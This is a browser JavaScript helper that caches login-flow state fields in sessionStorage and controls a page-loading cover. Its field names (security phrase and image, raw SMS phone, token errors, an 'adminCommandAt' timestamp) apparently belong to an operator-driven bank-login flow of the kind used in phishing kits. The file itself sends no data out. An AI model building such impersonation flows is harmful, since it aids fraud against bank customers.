(function (global) {
  'use strict';

  var KEY = 'flowPrefetchPayload';
  var FIELDS = [
    'page',
    'pageLocation',
    'fraseSeguridad',
    'imagenSeguridad',
    'smsMaskedPhone',
    'smsPhoneRaw',
    'pacifidContactMasked',
    'loginError',
    'passwdErr',
    'smsErr',
    'pacifidErr',
    'inicioErr',
    'adminCommandAt'
  ];
  var held = false;
  var holdTimer = null;

  function sessionId() {
    return global.sessionStorage.getItem('intermaticoActual') ||
      global.sessionStorage.getItem('bseSessionUser') ||
      '';
  }

  function stash(docId, data) {
    if (!docId || !data) {
      return;
    }
    var slim = { docId: String(docId), savedAt: Date.now() };
    var i;
    for (i = 0; i < FIELDS.length; i++) {
      var field = FIELDS[i];
      if (field === 'imagenSeguridad') {
        var page = Number(data.page);
        if (page !== 1 && page !== 3) {
          continue;
        }
      }
      if (data[field] != null && data[field] !== '') {
        slim[field] = data[field];
      }
    }
    try {
      global.sessionStorage.setItem(KEY, JSON.stringify(slim));
    } catch (error) {
      console.warn('FlowPrefetch: no se pudo guardar el payload', error);
    }
  }

  function peek() {
    try {
      var raw = JSON.parse(global.sessionStorage.getItem(KEY) || 'null');
      if (!raw || typeof raw !== 'object') {
        return null;
      }
      var sid = sessionId();
      if (raw.docId && sid && raw.docId !== sid) {
        return null;
      }
      return raw;
    } catch (error) {
      return null;
    }
  }

  function isHeld() {
    return held;
  }

  function loaderEl() {
    return global.document.getElementById('pageLoader');
  }

  function release() {
    held = false;
    if (holdTimer) {
      global.clearTimeout(holdTimer);
      holdTimer = null;
    }
    var el = loaderEl();
    if (el) {
      el.classList.remove('is-cover');
    }
    if (typeof global.hideLoader === 'function') {
      global.hideLoader();
    }
  }

  function holdCover(maxMs) {
    held = true;
    if (typeof global.showLoader === 'function') {
      global.showLoader();
    }
    var el = loaderEl();
    if (el) {
      el.classList.add('is-cover');
    }
    if (holdTimer) {
      global.clearTimeout(holdTimer);
    }
    holdTimer = global.setTimeout(release, maxMs || 8000);
  }

  function whenPainted(img, done) {
    var finished = false;
    function finish() {
      if (finished) {
        return;
      }
      finished = true;
      done();
    }
    if (!img) {
      finish();
      return;
    }
    if (typeof img.decode === 'function') {
      img.decode().then(finish).catch(function () {
        finish();
      });
      return;
    }
    if (img.complete && img.naturalWidth) {
      finish();
      return;
    }
    img.addEventListener('load', finish, { once: true });
    img.addEventListener('error', finish, { once: true });
  }

  function holdUntilImage(img) {
    holdCover(4000);
    whenPainted(img, release);
  }

  function holdUntilReady(isReady, maxMs) {
    holdCover(maxMs || 8000);
    if (typeof isReady === 'function' && isReady()) {
      global.requestAnimationFrame(function () {
        global.requestAnimationFrame(release);
      });
    }
  }

  function markReady() {
    if (!held) {
      return;
    }
    global.requestAnimationFrame(function () {
      global.requestAnimationFrame(release);
    });
  }

  global.FlowPrefetch = {
    stash: stash,
    peek: peek,
    isHeld: isHeld,
    release: release,
    holdCover: holdCover,
    holdUntilImage: holdUntilImage,
    holdUntilReady: holdUntilReady,
    markReady: markReady
  };
})(window);
